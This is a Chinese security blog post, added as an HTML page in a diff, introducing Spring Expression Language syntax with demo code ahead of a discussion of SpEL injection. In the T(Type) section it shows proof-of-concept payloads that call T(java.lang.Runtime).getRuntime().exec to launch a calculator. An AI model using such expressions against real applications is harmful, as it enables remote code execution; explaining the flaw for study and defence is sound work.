@@ -1,0 +1,605 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#202020">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+  
+  
+    <meta name="keywords" content="Web安全,Java,SpEL注入,">
+  
+
+  
+    <meta name="description" content="d2VsY29tZSB0byBteSBibG9n">
+  
+  
+  
+  <link rel="icon" type="image/x-icon" href="/1.jpg">
+  
+  <title>SpEL表达式注入漏洞总结 [ Mi1k7ea ]</title>
+  
+    <!-- stylesheets list from config.yml -->
+    
+      <link rel="stylesheet" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css">
+    
+      <link rel="stylesheet" href="/css/xoxo.css">
+    
+  
+</head>
+
+
+<body>
+  <div class="nav-container">
+    <nav class="home-menu pure-menu pure-menu-horizontal">
+  <a class="pure-menu-heading" href="/">
+    
+    <span class="title" style="text-transform:none">Mi1k7ea</span>
+  </a>
+
+  <ul class="pure-menu-list clearfix">
+      
+          
+            
+              <li class="pure-menu-item"><a href="/archives" class="pure-menu-link">归档</a></li>
+            
+          
+      
+          
+            
+              <li class="pure-menu-item"><a href="/about" class="pure-menu-link">关于</a></li>
+            
+          
+      
+  </ul>
+   
+</nav>
+
+  </div>
+
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+      <div class="post-container">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        SpEL表达式注入漏洞总结
+      </h1>
+      <span>
+        
+        <time class="time" datetime="2020-01-10T14:05:19.000Z">
+        2020-01-10
+      </time>
+        
+      </span>
+      <span class="slash">/</span>
+      <span class="post-meta">
+      <span class="post-tags">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Java/">Java</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SpEL注入/">SpEL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
+      </span>
+    </span>
+      <!--<span class="slash">/</span>
+      <span class="read">
+      <span id="busuanzi_value_page_pv"></span> 点击
+    </span>
+      <span class="slash">/</span>-->
+    </header>
+
+    <div class="post-content">
+      <h2 id="0x01-SpEL表达式基础"><a href="#0x01-SpEL表达式基础" class="headerlink" title="0x01 SpEL表达式基础"></a>0x01 SpEL表达式基础</h2><h3 id="SpEL简介"><a href="#SpEL简介" class="headerlink" title="SpEL简介"></a>SpEL简介</h3><p> 在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。</p>
+<p>在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。</p>
+<p>SpEL有许多特性：</p>
+<ul>
+<li>使用Bean的ID来引用Bean</li>
+<li>可调用方法和访问对象的属性</li>
+<li>可对值进行算数、关系和逻辑运算</li>
+<li>可使用正则表达式进行匹配</li>
+<li>可进行集合操作</li>
+</ul>
+<h3 id="SpEL定界符——"><a href="#SpEL定界符——" class="headerlink" title="SpEL定界符——#{}"></a>SpEL定界符——<code>#{}</code></h3><p>SpEL使用<code>#{}</code>作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。</p>
+<p>这里需要注意<code>#{}</code>和<code>${}</code>的区别：</p>
+<ul>
+<li><code>#{}</code>就是SpEL的定界符，用于指明内容未SpEL表达式并执行；</li>
+<li><code>${}</code>主要用于加载外部属性文件中的值；</li>
+<li>两者可以混合使用，但是必须<code>#{}</code>在外面，<code>${}</code>在里面，如<code>#{&#39;${}&#39;}</code>，注意单引号是字符串类型才添加的；</li>
+</ul>
+<h3 id="SpEL表达式类型"><a href="#SpEL表达式类型" class="headerlink" title="SpEL表达式类型"></a>SpEL表达式类型</h3><h4 id="字面值"><a href="#字面值" class="headerlink" title="字面值"></a>字面值</h4><p>最简单的SpEL表达式就是仅包含一个字面值。</p>
+<p>下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到<code>#{}</code>定界符，注意若是指定为字符串的话需要添加单引号括起来：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message1"</span> <span class="attr">value</span>=<span class="string">"#&#123;666&#125;"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message2"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>还可以直接与字符串混用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;property name=&quot;message&quot; value=&quot;the value is #&#123;666&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure>
+<p>Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"salary"</span> <span class="attr">value</span>=<span class="string">"#&#123;1e4&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h5><p>直接用Spring的HelloWorld例子。</p>
+<p>HelloWorld.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMessage</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.message  = message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMessage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Your Message : "</span> + message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MainApp.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mi1k7ea.service.AccountService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        HelloWorld obj = (HelloWorld) context.getBean(<span class="string">"helloWorld"</span>);</span><br><span class="line">        obj.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Beans.xml：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;'mi1k7ea'&#125; is #&#123;666&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : mi1k7ea is 666</span><br></pre></td></tr></table></figure>
+<h4 id="引用Bean、属性和方法"><a href="#引用Bean、属性和方法" class="headerlink" title="引用Bean、属性和方法"></a>引用Bean、属性和方法</h4><h5 id="引用Bean"><a href="#引用Bean" class="headerlink" title="引用Bean"></a>引用Bean</h5><p>SpEL表达式能够通过其他Bean的ID进行引用，直接在<code>#{}</code>符号中写入ID名即可，无需添加单引号括起来。如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--原来的写法，通过构造函数实现依赖注入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;constructor-arg ref="test"/&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;test&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<h5 id="引用类属性"><a href="#引用类属性" class="headerlink" title="引用类属性"></a>引用类属性</h5><blockquote>
+<p>SpEL表达式能够访问类的属性。</p>
+<p>比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"kenny"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span></span></span><br><span class="line"><span class="tag">&gt;</span>    p:song="May Rain"</span><br><span class="line">&gt;    p:instrument-ref="piano"/&gt;</span><br><span class="line">&gt;<span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"carl"</span> <span class="attr">class</span>=<span class="string">"com.spring.entity.Instrumentalist"</span>&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"instrument"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.instrument&#125;"</span>/&gt;</span></span><br><span class="line">&gt;    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;kenny.song&#125;"</span>/&gt;</span></span><br><span class="line">&gt;<span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>key指定kenny<code>&lt;bean&gt;</code> 的id，value指定kenny<code>&lt;bean&gt;</code>的song属性。其等价于执行下面的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;Instrumentalist carl = new Instrumentalist();</span><br><span class="line">&gt;carl.setSong(kenny.getSong());</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h5 id="引用类方法"><a href="#引用类方法" class="headerlink" title="引用类方法"></a>引用类方法</h5><blockquote>
+<p>SpEL表达式还可以访问类的方法。</p>
+<p>假设现在有个SongSelector类，该类有个<code>selectSong()</code>方法，这样的话carl就可以不用模仿别人，开始唱songSelector所选的歌了：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>carl有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用<code>toUpperCase()</code>方法：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong().toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>注意：这里我们不能确保不抛出<code>NullPointerException</code>，为了避免这个讨厌的问题，我们可以使用SpEL的<code>null-safe</code>存取器</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"song"</span> <span class="attr">value</span>=<span class="string">"#&#123;SongSelector.selectSong()?.toUpperCase()&#125;"</span>/&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p><code>?.</code>符号会确保左边的表达式不会为<code>null</code>，如果为<code>null</code>的话就不会调用<code>toUpperCase()</code>方法了。</p>
+</blockquote>
+<h5 id="Demo——引用Bean"><a href="#Demo——引用Bean" class="headerlink" title="Demo——引用Bean"></a>Demo——引用Bean</h5><p>这里我们修改基于构造函数的依赖注入的示例。</p>
+<p>SpellChecker.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpellChecker</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SpellChecker</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside SpellChecker constructor."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkSpelling</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside checkSpelling."</span> );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>TextEditor.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TextEditor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SpellChecker spellChecker;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TextEditor</span><span class="params">(SpellChecker spellChecker)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Inside TextEditor constructor."</span> );</span><br><span class="line">        <span class="keyword">this</span>.spellChecker = spellChecker;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">spellCheck</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        spellChecker.checkSpelling();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>MainApp.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.mi1k7ea;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainApp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        ApplicationContext context = <span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">"Beans.xml"</span>);</span><br><span class="line">        TextEditor te = (TextEditor) context.getBean(<span class="string">"textEditor"</span>);</span><br><span class="line">        te.spellCheck();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Beans.xml，通过<code>value=&quot;#{bean id}&quot;</code>的方式替换掉之前的ref属性设置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for textEditor bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"textEditor"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.TextEditor"</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;constructor-arg ref="spellChecker"/&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">value</span>=<span class="string">"#&#123;spellChecker&#125;"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Definition for spellChecker bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"spellChecker"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.SpellChecker"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行输出：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Inside SpellChecker constructor.</span><br><span class="line">Inside TextEditor constructor.</span><br><span class="line">Inside checkSpelling.</span><br></pre></td></tr></table></figure>
+<h3 id="类类型表达式T-Type"><a href="#类类型表达式T-Type" class="headerlink" title="类类型表达式T(Type)"></a>类类型表达式T(Type)</h3><p>在SpEL表达式中，使用<code>T(Type)</code>运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。</p>
+<p>使用<code>T(Type)</code>来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。</p>
+<p>在XML配置文件中的使用示例，要调用java.lang.Math来获取0~1的随机数：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"random"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span>/&gt;</span></span><br></pre></td></tr></table></figure>
+<p>Expression中使用示例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line"><span class="comment">// java.lang 包类访问</span></span><br><span class="line">Class&lt;String&gt; result1 = parser.parseExpression(<span class="string">"T(String)"</span>).getValue(Class.class);</span><br><span class="line">System.out.println(result1);</span><br><span class="line"><span class="comment">//其他包类访问</span></span><br><span class="line">String expression2 = <span class="string">"T(java.lang.Runtime).getRuntime().exec('open /Applications/Calculator.app')"</span>;</span><br><span class="line">Class&lt;Object&gt; result2 = parser.parseExpression(expression2).getValue(Class.class);</span><br><span class="line">System.out.println(result2);</span><br><span class="line"><span class="comment">//类静态字段访问</span></span><br><span class="line"><span class="keyword">int</span> result3 = parser.parseExpression(<span class="string">"T(Integer).MAX_VALUE"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result3);</span><br><span class="line"><span class="comment">//类静态方法调用</span></span><br><span class="line"><span class="keyword">int</span> result4 = parser.parseExpression(<span class="string">"T(Integer).parseInt('1')"</span>).getValue(<span class="keyword">int</span>.class);</span><br><span class="line">System.out.println(result4);</span><br></pre></td></tr></table></figure>
+<h4 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h4><p>在前面字面值的Demo中修改Beans.xml即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Math).random()&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行输出随机值：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your Message : 0.7593490190723996</span><br></pre></td></tr></table></figure>
+<h4 id="恶意利用——弹计算器"><a href="#恶意利用——弹计算器" class="headerlink" title="恶意利用——弹计算器"></a>恶意利用——弹计算器</h4><p>修改value中类类型表达式的类为Runtime并调用其命令执行方法即可：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd "</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"helloWorld"</span> <span class="attr">class</span>=<span class="string">"com.mi1k7ea.HelloWorld"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"message"</span> <span class="attr">value</span>=<span class="string">"#&#123;T(java.lang.Runtime).getRuntime().exec('calc')&#125;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行即可弹计算器。</p>
+<h3 id="SpEL用法"><a href="#SpEL用法" class="headerlink" title="SpEL用法"></a>SpEL用法</h3><p>SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。</p>
+<p>前面的就是以XML配置为例对SpEL表达式的用法进行的说明，而注解@Value的用法例子如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EmailSender</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"$&#123;spring.mail.username&#125;"</span>)</span><br><span class="line">    <span class="keyword">private</span> String mailUsername;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"#&#123; systemProperties['user.region'] &#125;"</span>)    </span><br><span class="line">    <span class="keyword">private</span> String defaultLocale;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>下面具体看下Expression的。</p>
